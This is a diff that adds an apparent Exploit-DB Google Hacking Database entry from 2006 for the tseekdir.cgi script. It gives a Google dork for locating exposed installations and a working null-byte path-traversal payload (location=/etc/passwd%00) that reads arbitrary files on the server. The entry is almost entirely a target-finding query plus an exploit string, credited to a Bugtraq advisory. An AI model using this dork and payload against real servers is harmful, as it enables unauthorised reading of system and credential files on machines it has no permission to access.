@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/1377
+Category:         Advisories and Vulnerabilities
+Published Date:   2006-05-22
+Author:           anonymous
+GoogleDork:       allinurl:tseekdir.cgi
+Description:      allinurl:tseekdir.cgi
+
+
+tseekdir.cgi?location=FILENAME%00eg:tseekdir.cgi?location=/etc/passwd%00basically any file on the server can be viewed by inserting a null (%00) into the URL.credit to duritohttp://seclists.org/bugtraq/2006/May/0184.html
